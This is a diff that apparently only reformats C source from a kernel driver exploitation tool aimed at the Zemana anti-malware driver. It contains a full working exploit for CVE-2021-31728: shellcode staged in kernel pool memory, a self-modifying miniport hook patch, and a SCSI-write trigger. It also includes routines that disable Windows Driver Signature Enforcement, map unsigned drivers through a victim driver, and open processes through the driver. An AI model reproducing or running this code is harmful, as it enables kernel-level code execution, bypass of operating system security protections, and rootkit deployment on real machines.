@@ -9,21 +9,21 @@ BYTE g_DebugBuffer[2048];
 
 #ifdef __cplusplus
 extern "C" {
-    void ZmShellStager();
-    void ZmShellStagerEnd();
-    void ZmShellDSEFix();
-    void ZmShellDSEFixEnd();
+void ZmShellStager();
+void ZmShellStagerEnd();
+void ZmShellDSEFix();
+void ZmShellDSEFixEnd();
 }
 #endif
 
-#pragma pack( push, 1 )
+#pragma pack(push, 1)
 typedef struct _ZM_SCSI_ACCESS {
     ULONG32 DiskNumber;
-    UCHAR   Pad0;
+    UCHAR Pad0;
 
-    UCHAR   PathId;
-    UCHAR   TargetId;
-    UCHAR   Lun;
+    UCHAR PathId;
+    UCHAR TargetId;
+    UCHAR Lun;
 
     ULONG32 OffsetHigh;
     ULONG32 OffsetLow;
@@ -31,50 +31,45 @@ typedef struct _ZM_SCSI_ACCESS {
     ULONG32 Length;
 
     ULONG32 Count;
-    //irrelevant
-} ZM_SCSI_ACCESS, * PZM_SCSI_ACCESS;
+    // irrelevant
+} ZM_SCSI_ACCESS, *PZM_SCSI_ACCESS;
 
 typedef struct _ZM_SCSI_MINIPORT_FIX {
-    CHAR    DriverName[MAX_PATH];
+    CHAR DriverName[MAX_PATH];
     ULONG32 Offset_Func1;
-    UCHAR    FixCode_Func1[128];
+    UCHAR FixCode_Func1[128];
     ULONG32 Offset_Func2;
-    UCHAR    FixCode_Func2[128];
-} ZM_SCSI_MINIPORT_FIX, * PZM_SCSI_MINIPORT_FIX;
-#pragma pack( pop )
+    UCHAR FixCode_Func2[128];
+} ZM_SCSI_MINIPORT_FIX, *PZM_SCSI_MINIPORT_FIX;
+#pragma pack(pop)
 
 typedef struct _UNZERO_PTR {
-    ULONG_PTR   addr;
-    ULONG_PTR   mask;
-} UNZERO_PTR, * PUNZERO_PTR;
+    ULONG_PTR addr;
+    ULONG_PTR mask;
+} UNZERO_PTR, *PUNZERO_PTR;
 
 /*
-* UnzeroXorMask
-*
-* Purpose:
-*
-* Shellcode can't contain 2 consecutive zeroes because Zemana expects it to be a string.
-* Make supplied address string buffer compatible.
-*
-*/
-UNZERO_PTR UnzeroXorMask(ULONG_PTR x)
-{
-    int             c;
-    unsigned char   e;
-    ULONG_PTR       u, w;
-    UNZERO_PTR      r = { 0, 0 };
+ * UnzeroXorMask
+ *
+ * Purpose:
+ *
+ * Shellcode can't contain 2 consecutive zeroes because Zemana expects it to be
+ * a string. Make supplied address string buffer compatible.
+ *
+ */
+UNZERO_PTR UnzeroXorMask(ULONG_PTR x) {
+    int c;
+    unsigned char e;
+    ULONG_PTR u, w;
+    UNZERO_PTR r = {0, 0};
 
-    for (c = 0; c < sizeof(r.addr); ++c)
-    {
+    for (c = 0; c < sizeof(r.addr); ++c) {
         e = x & 0xff;
 
-        if (e == 0x69)
-        {
+        if (e == 0x69) {
             w = (e ^ 0xaa);
             u = (0xaa);
-        }
-        else
-        {
+        } else {
             w = (e ^ 0x69);
             u = (0x69);
         }
@@ -88,20 +83,18 @@ UNZERO_PTR UnzeroXorMask(ULONG_PTR x)
 }
 
 /*
-* ZmExploit_CVE2021_31728
-*
-* Purpose:
-*
-* Exploit Zemana crapware features using CVE2021-31728.
-* Note several earlier exploits for wide variety of this fake AV factory "SDK" used as well.
-*
-*/
-BOOL ZmExploit_CVE2021_31728(
-    _In_ PKDU_CONTEXT Context,
-    _In_ PVOID StagerShellCode,
-    _In_ SIZE_T StagerShellSize
-)
-{
+ * ZmExploit_CVE2021_31728
+ *
+ * Purpose:
+ *
+ * Exploit Zemana crapware features using CVE2021-31728.
+ * Note several earlier exploits for wide variety of this fake AV factory "SDK"
+ * used as well.
+ *
+ */
+BOOL ZmExploit_CVE2021_31728(_In_ PKDU_CONTEXT Context,
+                             _In_ PVOID StagerShellCode,
+                             _In_ SIZE_T StagerShellSize) {
     BOOL bResult = FALSE;
     PSYSTEM_BIGPOOL_INFORMATION pi = NULL;
     ULONG_PTR* poolList = NULL;
@@ -112,20 +105,20 @@ BOOL ZmExploit_CVE2021_31728(
     CHAR buffer[4096 - 16 + 4];
 
     do {
-
         if (StagerShellSize > 2048) {
             supPrintfEvent(kduEventError,
-                "[!] Stager size exceeds limit, abort\r\n");
+                           "[!] Stager size exceeds limit, abort\r\n");
             break;
         }
 
         //
         // At first we locate initial Zemana pools and remember them.
         //
-        pi = (PSYSTEM_BIGPOOL_INFORMATION)supGetSystemInfo(SystemBigPoolInformation);
+        pi = (PSYSTEM_BIGPOOL_INFORMATION)supGetSystemInfo(
+            SystemBigPoolInformation);
         if (pi == NULL) {
             supPrintfEvent(kduEventError,
-                "[!] Failed to query pool information, abort\r\n");
+                           "[!] Failed to query pool information, abort\r\n");
             break;
         }
 
@@ -136,7 +129,7 @@ BOOL ZmExploit_CVE2021_31728(
 
         if (poolCount == 0) {
             supPrintfEvent(kduEventError,
-                "[!] Abort: No Zemana pools found\r\n");
+                           "[!] Abort: No Zemana pools found\r\n");
             break;
         }
 
@@ -148,7 +141,8 @@ BOOL ZmExploit_CVE2021_31728(
 
         for (i = 0; i < pi->Count; i++) {
             if (pi->AllocatedInfo[i].TagUlong == ZEMANA_POOL_TAG)
-                poolList[currentPool++] = (ULONG_PTR)pi->AllocatedInfo[i].VirtualAddress;
+                poolList[currentPool++] =
+                    (ULONG_PTR)pi->AllocatedInfo[i].VirtualAddress;
         }
 
         supHeapFree(pi);
@@ -164,14 +158,16 @@ BOOL ZmExploit_CVE2021_31728(
         FsRtlIsNameInExpressionEntry[4] = 'A';
         FsRtlIsNameInExpressionEntry[5] = 0;
 
-        bResult = supCallDriver(Context->DeviceHandle,
-            IOCTL_ZEMANA_PROTECT_REGISTRY,
+        bResult = supCallDriver(
+            Context->DeviceHandle, IOCTL_ZEMANA_PROTECT_REGISTRY,
             &FsRtlIsNameInExpressionEntry, sizeof(FsRtlIsNameInExpressionEntry),
-            &FsRtlIsNameInExpressionEntry, sizeof(FsRtlIsNameInExpressionEntry));
+            &FsRtlIsNameInExpressionEntry,
+            sizeof(FsRtlIsNameInExpressionEntry));
 
         if (!bResult) {
             supPrintfEvent(kduEventError,
-                "[!] Failed to insert FsRtlIsNameInExpression bypass entry, abort\r\n");
+                           "[!] Failed to insert FsRtlIsNameInExpression "
+                           "bypass entry, abort\r\n");
             break;
         }
 
@@ -192,13 +188,13 @@ BOOL ZmExploit_CVE2021_31728(
         buffer[4096 - 16 + 4 - 2] = 0;
         buffer[4096 - 16 + 4 - 1] = 0;
 
-        bResult = supCallDriver(Context->DeviceHandle,
-            IOCTL_ZEMANA_PROTECT_REGISTRY,
-            buffer, 4096 - 16 + 4,
-            buffer, 4096 - 16 + 4);
+        bResult =
+            supCallDriver(Context->DeviceHandle, IOCTL_ZEMANA_PROTECT_REGISTRY,
+                          buffer, 4096 - 16 + 4, buffer, 4096 - 16 + 4);
 
         if (!bResult) {
-            supPrintfEvent(kduEventError,
+            supPrintfEvent(
+                kduEventError,
                 "[!] Failed to insert shellcode into string buffer, abort\r\n");
             break;
         }
@@ -206,10 +202,11 @@ BOOL ZmExploit_CVE2021_31728(
         //
         // Find new Zemana driver pool, if there is anything new - we failed.
         //
-        pi = (PSYSTEM_BIGPOOL_INFORMATION)supGetSystemInfo(SystemBigPoolInformation);
+        pi = (PSYSTEM_BIGPOOL_INFORMATION)supGetSystemInfo(
+            SystemBigPoolInformation);
         if (pi == NULL) {
             supPrintfEvent(kduEventError,
-                "[!] Failed to query pool information, abort\r\n");
+                           "[!] Failed to query pool information, abort\r\n");
             break;
         }
 
@@ -218,19 +215,18 @@ BOOL ZmExploit_CVE2021_31728(
 
         for (i = 0; i < pi->Count; i++) {
             if (pi->AllocatedInfo[i].TagUlong == ZEMANA_POOL_TAG) {
-
                 bFound = TRUE;
 
                 for (currentPool = 0; currentPool < poolCount; currentPool++) {
-
-                    bFound = (poolList[currentPool] == (ULONG_PTR)pi->AllocatedInfo[i].VirtualAddress);
+                    bFound = (poolList[currentPool] ==
+                              (ULONG_PTR)pi->AllocatedInfo[i].VirtualAddress);
                     if (bFound)
                         break;
-
                 }
 
                 if (!bFound) {
-                    kernelShellCode = (ULONG_PTR)pi->AllocatedInfo[i].VirtualAddress & ~1;
+                    kernelShellCode =
+                        (ULONG_PTR)pi->AllocatedInfo[i].VirtualAddress & ~1;
                     kernelShellCode += 0x10;
                     break;
                 }
@@ -244,17 +240,18 @@ BOOL ZmExploit_CVE2021_31728(
         poolList = NULL;
 
         if (bFound) {
-            supPrintfEvent(kduEventError,
+            supPrintfEvent(
+                kduEventError,
                 "[!] Could not find allocated stager shellcode, abort\r\n");
             break;
         }
 
-        printf_s("[+] Stager shellCode allocated at 0x%llX\r\n", kernelShellCode);
+        printf_s("[+] Stager shellCode allocated at 0x%llX\r\n",
+                 kernelShellCode);
 
         CHAR szDriverName[MAX_PATH];
 
         RtlSecureZeroMemory(&szDriverName, sizeof(szDriverName));
-        
 
         //
         // Trigger shellcode.
@@ -267,20 +264,25 @@ BOOL ZmExploit_CVE2021_31728(
         drvFileName.Buffer = NULL;
         drvFileName.Length = drvFileName.MaximumLength = 0;
 
-        if (!NT_SUCCESS(supConvertToAnsi(Context->Provider->LoadData->DriverName, &drvFileName)))
+        if (!NT_SUCCESS(supConvertToAnsi(
+                Context->Provider->LoadData->DriverName, &drvFileName)))
             break;
 
-        StringCchPrintfA(MiniportFix.DriverName, MAX_PATH, "%s.sys", drvFileName.Buffer);
+        StringCchPrintfA(MiniportFix.DriverName, MAX_PATH, "%s.sys",
+                         drvFileName.Buffer);
 
         RtlFreeAnsiString(&drvFileName);
 
-        MiniportFix.Offset_Func1 = 0xD553; //driver specific offset, correct it for another sample
+        MiniportFix.Offset_Func1 =
+            0xD553;  // driver specific offset, correct it for another sample
 
-        BYTE patchCode[] =
-        {   0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov rax, imm64
-            0x80, 0x05, 0x01, 0x00, 0x00, 0x00, 0x10,                   // add byte ptr [rip+0], 0x10
-            0xFF, 0xC0,                                                 // inc eax -> call rax (after the self-modifying)
-            0xEB, 0x00                                                  // jmp rel8 
+        BYTE patchCode[] = {
+            0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+            0x00, 0x00,                                // mov rax, imm64
+            0x80, 0x05, 0x01, 0x00, 0x00, 0x00, 0x10,  // add byte ptr [rip+0],
+                                                       // 0x10
+            0xFF, 0xC0,  // inc eax -> call rax (after the self-modifying)
+            0xEB, 0x00   // jmp rel8
         };
 
         RtlCopyMemory(MiniportFix.FixCode_Func1, patchCode, sizeof(patchCode));
@@ -290,18 +292,20 @@ BOOL ZmExploit_CVE2021_31728(
         //
         *(ULONG64*)(MiniportFix.FixCode_Func1 + 2) = kernelShellCode;
 
-        bResult = supCallDriver(Context->DeviceHandle,
-            IOCTL_ZEMANA_SAVE_MINIPORT_FIX,
-            &MiniportFix, sizeof(ZM_SCSI_MINIPORT_FIX),
-            &MiniportFix, sizeof(ZM_SCSI_MINIPORT_FIX));
+        bResult =
+            supCallDriver(Context->DeviceHandle, IOCTL_ZEMANA_SAVE_MINIPORT_FIX,
+                          &MiniportFix, sizeof(ZM_SCSI_MINIPORT_FIX),
+                          &MiniportFix, sizeof(ZM_SCSI_MINIPORT_FIX));
 
         if (!bResult) {
             supPrintfEvent(kduEventError,
-                "[!] Could not install miniport hook, abort\r\n");
+                           "[!] Could not install miniport hook, abort\r\n");
             break;
         }
 
-        printf_s("[+] Zemana miniport hook installed, performing stager shellcode execution\r\n");
+        printf_s(
+            "[+] Zemana miniport hook installed, performing stager shellcode "
+            "execution\r\n");
 
         RtlSecureZeroMemory(&scsiRequest, sizeof(scsiRequest));
 
@@ -309,10 +313,9 @@ BOOL ZmExploit_CVE2021_31728(
         scsiRequest.Length = 1;
         RtlFillMemory(sectorBuffer, sizeof(sectorBuffer), 0xff);
 
-        supCallDriver(Context->DeviceHandle,
-            IOCTL_ZEMANA_SCSI_WRITE,
-            &scsiRequest, sizeof(ZM_SCSI_ACCESS),
-            &sectorBuffer, sizeof(sectorBuffer));
+        supCallDriver(Context->DeviceHandle, IOCTL_ZEMANA_SCSI_WRITE,
+                      &scsiRequest, sizeof(ZM_SCSI_ACCESS), &sectorBuffer,
+                      sizeof(sectorBuffer));
 
         printf_s("[+] Stager shellcode executed\r\n");
 
@@ -320,24 +323,23 @@ BOOL ZmExploit_CVE2021_31728(
 
     } while (FALSE);
 
-    if (pi) supHeapFree(pi);
-    if (poolList) supHeapFree(poolList);
+    if (pi)
+        supHeapFree(pi);
+    if (poolList)
+        supHeapFree(poolList);
 
     return bResult;
 }
 
 /*
-* ZmMapDriver
-*
-* Purpose:
-*
-* Run mapper.
-*
-*/
-BOOL ZmMapDriver(
-    _In_ PKDU_CONTEXT Context,
-    _In_ PVOID ImageBase)
-{
+ * ZmMapDriver
+ *
+ * Purpose:
+ *
+ * Run mapper.
+ *
+ */
+BOOL ZmMapDriver(_In_ PKDU_CONTEXT Context, _In_ PVOID ImageBase) {
     BOOL bResult = FALSE, bLocked = FALSE;
 
     KDU_VICTIM_PROVIDER* victimProv = Context->Victim;
@@ -355,15 +357,11 @@ BOOL ZmMapDriver(
     FUNCTION_ENTER_MSG(__FUNCTION__);
 
     do {
-        if (VpCreate(victimProv,
-            Context->ModuleBase,
-            &victimDeviceHandle,
-            NULL,
-            NULL))
-        {
-            printf_s("[+] Victim is loaded, handle 0x%p\r\n", victimDeviceHandle);
-        }
-        else {
+        if (VpCreate(victimProv, Context->ModuleBase, &victimDeviceHandle, NULL,
+                     NULL)) {
+            printf_s("[+] Victim is loaded, handle 0x%p\r\n",
+                     victimDeviceHandle);
+        } else {
             supShowWin32Error("[!] Cannot load victim target", GetLastError());
         }
 
@@ -371,8 +369,10 @@ BOOL ZmMapDriver(
 
         RtlSecureZeroMemory(&vdi, sizeof(vdi));
 
-        if (!VpQueryInformation(Context->Victim, VictimDriverInformation, &vdi, sizeof(vdi))) {
-            supShowWin32Error("[!] Cannot query victim driver information", GetLastError());
+        if (!VpQueryInformation(Context->Victim, VictimDriverInformation, &vdi,
+                                sizeof(vdi))) {
+            supShowWin32Error("[!] Cannot query victim driver information",
+                              GetLastError());
             break;
         }
 
@@ -380,18 +380,18 @@ BOOL ZmMapDriver(
 
         if (dispatchAddress == 0) {
             supPrintfEvent(kduEventError,
-                "[!] Could not query victim target\r\n");
+                           "[!] Could not query victim target\r\n");
             break;
         }
-        
+
         VICTIM_IMAGE_INFORMATION vi;
 
         RtlSecureZeroMemory(&vi, sizeof(vi));
 
-        if (!VpQueryInformation(
-            Context->Victim, VictimImageInformation, &vi, sizeof(vi)))
-        {
-            supShowWin32Error("[!] Cannot query victim image information", GetLastError());
+        if (!VpQueryInformation(Context->Victim, VictimImageInformation, &vi,
+                                sizeof(vi))) {
+            supShowWin32Error("[!] Cannot query victim image information",
+                              GetLastError());
             break;
         }
 
@@ -450,8 +450,10 @@ BOOL ZmMapDriver(
 
     } while (FALSE);
 
-    if (bLocked) VirtualUnlock(pvPayload, cbPayload);
-    if (pvPayload) ntsupVirtualFree(pvPayload);
+    if (bLocked)
+        VirtualUnlock(pvPayload, cbPayload);
+    if (pvPayload)
+        ntsupVirtualFree(pvPayload);
     if (sectionHandle) {
         NtClose(sectionHandle);
     }
@@ -464,19 +466,16 @@ BOOL ZmMapDriver(
 }
 
 /*
-* ZmControlDSE
-*
-* Purpose:
-*
-* Change Windows CodeIntegrity flags state via Zemana driver.
-*
-*/
-BOOL ZmControlDSE(
-    _In_ PKDU_CONTEXT Context,
-    _In_ ULONG DSEValue,
-    _In_ ULONG_PTR Address
-)
-{
+ * ZmControlDSE
+ *
+ * Purpose:
+ *
+ * Change Windows CodeIntegrity flags state via Zemana driver.
+ *
+ */
+BOOL ZmControlDSE(_In_ PKDU_CONTEXT Context,
+                  _In_ ULONG DSEValue,
+                  _In_ ULONG_PTR Address) {
     BOOL bResult = FALSE;
     UNZERO_PTR uptr;
     unsigned char shellBuffer[1000];
@@ -502,57 +501,47 @@ BOOL ZmControlDSE(
     bResult = ZmExploit_CVE2021_31728(Context, &shellBuffer, shellSize);
 
     if (bResult)
-        supPrintfEvent(kduEventInformation, "[+] DSE patch executed successfully\r\n");
+        supPrintfEvent(kduEventInformation,
+                       "[+] DSE patch executed successfully\r\n");
 
     return bResult;
 }
 
 /*
-* ZmOpenProcess
-*
-* Purpose:
-*
-* Open process via Zemana driver.
-*
-*/
-BOOL WINAPI ZmOpenProcess(
-    _In_ HANDLE DeviceHandle,
-    _In_ HANDLE ProcessId,
-    _In_ ACCESS_MASK DesiredAccess,
-    _Out_ PHANDLE ProcessHandle)
-{
+ * ZmOpenProcess
+ *
+ * Purpose:
+ *
+ * Open process via Zemana driver.
+ *
+ */
+BOOL WINAPI ZmOpenProcess(_In_ HANDLE DeviceHandle,
+                          _In_ HANDLE ProcessId,
+                          _In_ ACCESS_MASK DesiredAccess,
+                          _Out_ PHANDLE ProcessHandle) {
     UNREFERENCED_PARAMETER(DesiredAccess);
 
     *ProcessHandle = NULL;
 
-    return supCallDriver(DeviceHandle,
-        IOCTL_ZEMANA_OPEN_PROCESS,
-        &ProcessId,
-        sizeof(ProcessId),
-        ProcessHandle,
-        sizeof(ProcessHandle));
+    return supCallDriver(DeviceHandle, IOCTL_ZEMANA_OPEN_PROCESS, &ProcessId,
+                         sizeof(ProcessId), ProcessHandle,
+                         sizeof(ProcessHandle));
 }
 
 /*
-* ZmRegisterDriver
-*
-* Purpose:
-*
-* Register Zemana driver client.
-*
-*/
-BOOL WINAPI ZmRegisterDriver(
-    _In_ HANDLE DeviceHandle,
-    _In_opt_ PVOID Param)
-{
+ * ZmRegisterDriver
+ *
+ * Purpose:
+ *
+ * Register Zemana driver client.
+ *
+ */
+BOOL WINAPI ZmRegisterDriver(_In_ HANDLE DeviceHandle, _In_opt_ PVOID Param) {
     UNREFERENCED_PARAMETER(Param);
 
     DWORD currentProcessId = GetCurrentProcessId(), dummy = 0;
 
-    return supCallDriver(DeviceHandle,
-        IOCTL_ZEMANA_REGISTER_PROCESS,
-        &currentProcessId,
-        sizeof(DWORD),
-        &dummy,
-        sizeof(DWORD));
+    return supCallDriver(DeviceHandle, IOCTL_ZEMANA_REGISTER_PROCESS,
+                         &currentProcessId, sizeof(DWORD), &dummy,
+                         sizeof(DWORD));
 }
